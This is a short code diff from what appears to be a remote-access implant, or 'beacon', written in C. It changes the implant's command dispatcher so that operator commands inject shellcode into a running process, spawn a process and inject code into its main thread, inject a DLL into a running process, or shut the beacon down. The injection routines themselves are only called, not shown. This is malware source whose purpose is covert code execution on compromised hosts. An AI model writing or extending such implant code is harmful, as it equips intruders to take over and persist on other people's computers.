@@ -90,22 +90,28 @@ void main()
             break;
 
         case 0x2000:
-            // execute module, this is much stealthier
-            Success = ExecuteCode(Buffer, TRUE);
+            // inject shellcode into a running process
+            Success = InjectExecuteCode(Buffer);
             break;
 
         case 0x3000:
-            // execute code provided from the user, execution method is diffrent
-            // because the users will want output from there code. Also the module
-            // code execution technique wont work so well will variable code
-            // provided by a user.
-            Success = ExecuteCode(Buffer, FALSE);
+            // spawn a process and inject code into its main thread
+            Success = SpawnExecuteCode(Buffer);
             break;
 
         case 0x4000:
             // stdlib command so lets run it
             Success = Stdlib(Buffer);
             break;
+
+        case 0x5000:
+            // inject a dll into a running process
+            Success = InjectExecuteDll(Buffer);
+            break;
+
+        case 0x6000:
+            // beacon will die
+            return;
         }
 
         if (!Success)
